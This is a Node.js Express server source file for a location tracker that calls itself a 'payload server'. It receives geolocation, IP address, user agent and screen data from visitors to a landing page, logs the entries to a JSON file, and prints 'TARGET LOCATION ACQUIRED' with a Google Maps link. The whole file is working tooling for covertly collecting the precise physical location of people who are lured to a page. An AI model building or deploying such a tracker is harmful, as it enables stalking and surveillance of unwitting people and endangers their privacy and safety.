const express = require('express');
const path = require('path');
const fs = require('fs');
const app = express();
const PORT = process.env.PORT || 3000;

const DATA_FILE = path.join(__dirname, 'locations.json');

// Middleware
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

// -------- Helpers: read/write JSON --------
function readLocations() {
    try {
        if (!fs.existsSync(DATA_FILE)) return [];
        const raw = fs.readFileSync(DATA_FILE, 'utf-8');
        return raw.trim() ? JSON.parse(raw) : [];
    } catch (err) {
        console.error('⚠️  Read error:', err.message);
        return [];
    }
}

function writeLocations(data) {
    try {
        fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2), 'utf-8');
    } catch (err) {
        console.error('⚠️  Write error:', err.message);
    }
}

// -------- ANSI helpers for pretty console --------
const G = '\x1b[32m', BG = '\x1b[92m', R = '\x1b[31m', Y = '\x1b[33m';
const C = '\x1b[36m', M = '\x1b[35m', DIM = '\x1b[2m', BOLD = '\x1b[1m';
const RESET = '\x1b[0m';

// -------- Banner --------
function banner() {
    console.clear();
    console.log(`${BG}${BOLD}`);
    console.log('  ██╗     ██████╗  ██████╗ █████╗ ████████╗██╗ ██████╗ ███╗   ██╗');
    console.log('  ██║     ██╔═══██╗██╔════╝██╔══██╗╚══██╔══╝██║██╔═══██╗████╗  ██║');
    console.log('  ██║     ██║   ██║██║     ███████║   ██║   ██║██║   ██║██╔██╗ ██║');
    console.log('  ██║     ██║   ██║██║     ██╔══██║   ██║   ██║██║   ██║██║╚██╗██║');
    console.log('  ███████╗╚██████╔╝╚██████╗██║  ██║   ██║   ██║╚██████╔╝██║ ╚████║');
    console.log('  ╚══════╝ ╚═════╝  ╚═════╝╚═╝  ╚═╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝');
    console.log(`${RESET}${G}         >> TRACKER v4.0 — WITH PERSISTENT JSON LOG <<${RESET}`);
    console.log(`${DIM}${G}  ─────────────────────────────────────────────────────────────${RESET}`);
    console.log(`${G}  [+] Payload server    : ${BG}http://localhost:${PORT}${RESET}`);
    console.log(`${G}  [+] Admin dashboard   : ${BG}http://localhost:${PORT}/admin${RESET}`);
    console.log(`${G}  [+] JSON storage      : ${BG}${DATA_FILE}${RESET}`);
    console.log(`${G}  [+] Awaiting target interaction...${RESET}`);
    console.log(`${DIM}${G}  ─────────────────────────────────────────────────────────────${RESET}\n`);
}

// -------- Fake decrypt animation --------
function fakeDecrypt(cb) {
    const frames = ['▖','▘','▝','▗'];
    let i = 0;
    const iv = setInterval(() => {
        process.stdout.write(`\r${G}[ ${BG}${frames[i % 4]}${G} ] ${Y}Decrypting geolocation payload...${RESET}`);
        if (++i > 10) {
            clearInterval(iv);
            process.stdout.write('\r' + ' '.repeat(60) + '\r');
            cb();
        }
    }, 80);
}

// -------- Routes --------

// Landing page
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Admin dashboard
app.get('/admin', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'admin.html'));
});

// API: receive location, save to JSON
app.post('/api/location', (req, res) => {
    const { lat, lng, accuracy, timestamp, userAgent, screen } = req.body;
    const ip = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || '').replace('::ffff:', '');

    const entry = {
        id: Date.now() + '-' + Math.random().toString(36).slice(2, 8),
        ip,
        lat,
        lng,
        accuracy: accuracy || null,
        screen: screen || 'unknown',
        userAgent: userAgent || 'unknown',
        timestamp: timestamp || Date.now(),
        receivedAt: new Date().toISOString()
    };

    console.log(`${R}${BOLD}>>> INCOMING TRANSMISSION DETECTED <<<${RESET}`);

    fakeDecrypt(() => {
        // Save to file
        const all = readLocations();
        all.push(entry);
        writeLocations(all);

        const mapsUrl = `https://www.google.com/maps?q=${lat},${lng}`;
        console.log(`${G}┌─────────────────────────────────────────────────────────────┐${RESET}`);
        console.log(`${G}│${BG}${BOLD}  📡  TARGET LOCATION ACQUIRED  (saved to JSON)            ${RESET}${G}│${RESET}`);
        console.log(`${G}├─────────────────────────────────────────────────────────────┤${RESET}`);
        console.log(`${G}│${RESET} ${C}ID        :${RESET} ${DIM}${entry.id}${RESET}`);
        console.log(`${G}│${RESET} ${C}IP ADDR   :${RESET} ${BG}${ip}${RESET}`);
        console.log(`${G}│${RESET} ${C}TIMESTAMP :${RESET} ${BG}${new Date(entry.timestamp).toLocaleString()}${RESET}`);
        console.log(`${G}│${RESET} ${C}LATITUDE  :${RESET} ${Y}${lat}${RESET}`);
        console.log(`${G}│${RESET} ${C}LONGITUDE :${RESET} ${Y}${lng}${RESET}`);
        console.log(`${G}│${RESET} ${C}ACCURACY  :${RESET} ${Y}${accuracy ? accuracy + ' m' : 'N/A'}${RESET}`);
        console.log(`${G}│${RESET} ${C}SCREEN    :${RESET} ${DIM}${entry.screen}${RESET}`);
        console.log(`${G}│${RESET} ${C}MAPS      :${RESET} ${BG}${mapsUrl}${RESET}`);
        console.log(`${G}├─────────────────────────────────────────────────────────────┤${RESET}`);
        console.log(`${G}│${RESET} ${M}TOTAL RECORDS IN JSON:${RESET} ${BG}${all.length}${RESET}`);
        console.log(`${G}│${RESET} ${M}VIEW DASHBOARD       :${RESET} ${BG}http://localhost:${PORT}/admin${RESET}`);
        console.log(`${G}└─────────────────────────────────────────────────────────────┘${RESET}\n`);
    });

    res.json({ success: true, id: entry.id });
});

// API: return all locations (for admin page)
app.get('/api/locations', (req, res) => {
    res.json(readLocations());
});

// API: clear all locations
app.delete('/api/locations', (req, res) => {
    writeLocations([]);
    console.log(`${R}🗑️  All locations cleared by admin.${RESET}`);
    res.json({ success: true });
});

// Health
app.get('/health', (req, res) => res.send('OK'));

// Start
app.listen(PORT, () => banner());